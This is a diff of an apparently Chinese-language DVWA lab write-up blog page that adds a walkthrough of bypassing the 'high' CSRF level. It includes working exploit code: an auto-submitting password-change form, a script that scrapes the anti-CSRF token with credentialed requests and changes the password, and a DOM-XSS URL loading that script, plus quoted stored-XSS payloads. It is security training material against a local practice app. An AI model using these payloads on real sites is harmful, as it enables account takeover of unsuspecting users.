@@ -86,7 +86,7 @@
 <meta property="og:site_name" content="QuanYex&#39;s Blog">
 <meta property="og:description" content="xss存储型xsslow查看服务端代码可以发现对name 和 message没有 进行过滤和检查，因此存在xss漏洞 name参数输入时有字数限制，因此可以在F12中修改其长度或者抓包后改为： 12&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;&lt;img src&#x3D;2  onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;  message参数也是相同以上两种都适">
 <meta property="article:published_time" content="2020-03-14T07:14:39.000Z">
-<meta property="article:modified_time" content="2020-03-20T02:59:59.420Z">
+<meta property="article:modified_time" content="2020-03-21T08:13:10.301Z">
 <meta property="article:author" content="QuanYex">
 <meta property="article:tag" content="DVWA">
 <meta name="twitter:card" content="summary">
@@ -297,8 +297,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-03-20T10:59:59+08:00">
-                2020-03-20
+              <time title="更新于" itemprop="dateModified" datetime="2020-03-21T16:13:10+08:00">
+                2020-03-21
               </time>
             
           </span>
@@ -434,7 +434,56 @@
 <p><code>$_SERVER[ &#39;SERVER_NAME&#39; ]</code>：PHP中获取服务器主机的名称，即HTTP数据包中的Host参数的值。</p>
 <p>过滤规则是http包头的Referer参数的值中必须包含主机名（这里是quanyex.local.com）,所以可以将攻击页面命名为quanyex.local.com.html就可以绕过了。（在本地不命名也可以，因为同用Phpstudy的apache服务器）</p>
 <p>页面代码与上个级别的代码相同。</p>
-<h2 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h2>
+<h2 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h2><p>查看服务器代码，代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
+<p>大致思路就是获取token值，然后带着token值去请求服务器以成功修改密码，对于token值来说，如果你新建一个页面（储存于攻击者服务器下）去获取token（位于用户的服务器下）这是现代浏览器所不被允许的，例如：新建一个gettoken.html页面，页面代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span><span class="params">()</span></span></span></span><br><span class="line"><span class="javascript">  &#123; <span class="built_in">document</span>.getElementsByName(<span class="string">'user_token'</span>[<span class="number">0</span>].value=<span class="built_in">document</span>.getElementById(<span class="string">"hack"</span>).contentWindow.document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"><span class="javascript">   <span class="built_in">document</span>.getElementById(<span class="string">"transfer"</span>).submit(); </span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://localhost/dvwa-master/vulnerabilities/csrf/"</span> <span class="attr">id</span>=<span class="string">"hack"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">height</span>=<span class="string">"400"</span> <span class="attr">width</span>=<span class="string">"400"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"attack()"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://localhost/DVWA-master/vulnerabilities/csrf"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"fqyfqy"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"fqyfqy"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_token"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当访问此网页时显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SecurityError: Permission denied to access property &quot;document&quot; on cross-origin object</span><br></pre></td></tr></table></figure>
+
+<p>这表示禁止访问，因为不是同源。</p>
+<p>下表给出了相对<code>http://a.xyz.com/dir/page.html</code>同源检测的示例: </p>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>结果</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>http://a.xyz.com/dir2/other.html</code></td>
+<td>成功</td>
+<td></td>
+</tr>
+<tr>
+<td><code>http://a.xyz.com/dir/inner/another.html</code></td>
+<td>成功</td>
+<td></td>
+</tr>
+<tr>
+<td><code>https://a.xyz.com/secure.html</code></td>
+<td>失败</td>
+<td>不同协议 ( https和http )</td>
+</tr>
+<tr>
+<td><code>http://a.xyz.com:81/dir/etc.html</code></td>
+<td>失败</td>
+<td>不同端口 ( 81和80)</td>
+</tr>
+<tr>
+<td><code>http://a.opq.com/dir/other.html</code></td>
+<td>失败</td>
+<td>不同域名 ( xyz和opq)</td>
+</tr>
+</tbody></table>
+<p>因此，在这里我们需要利用xss来实现或许token，high级别DOM型xss页面可以从url中加载js脚本，先构造一个xss脚本为<code>gettoken.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://quanyex.local.com/dvwa-master/vulnerabilities/csrf/'</span>;</span><br><span class="line"><span class="keyword">var</span> pass = <span class="string">'password'</span>;</span><br><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> hacked = <span class="literal">false</span>;</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">        <span class="keyword">var</span> regex = <span class="regexp">/user_token' value='(.*)' /</span>;</span><br><span class="line">        <span class="keyword">var</span> match = text.match(regex);</span><br><span class="line">        <span class="keyword">var</span> token = match[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">var</span> new_url = <span class="string">'http://quanyex.local.com/dvwa-master/vulnerabilities/csrf/?user_token='</span>+token+<span class="string">'&amp;password_new='</span>+pass+<span class="string">'&amp;password_conf='</span>+pass+<span class="string">'&amp;Change=Change'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!hacked)&#123;</span><br><span class="line">            hacked = <span class="literal">true</span>;</span><br><span class="line">            xmlhttp.open(<span class="string">"GET"</span>, new_url, <span class="literal">false</span> );</span><br><span class="line">            xmlhttp.send();  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>, theUrl );</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
+
+<p>然后构造URL诱导用户点击：</p>
+<p><code>http://quanyex.local.com/dvwa-master/vulnerabilities/xss_d/?default=English#&lt;script src=&quot;http://quanyex.local.com/gettoken.js&quot;&gt;&lt;/script&gt;</code></p>
+<p>这样一来就可以将密码改为password。</p>
+
       
     </div>
     
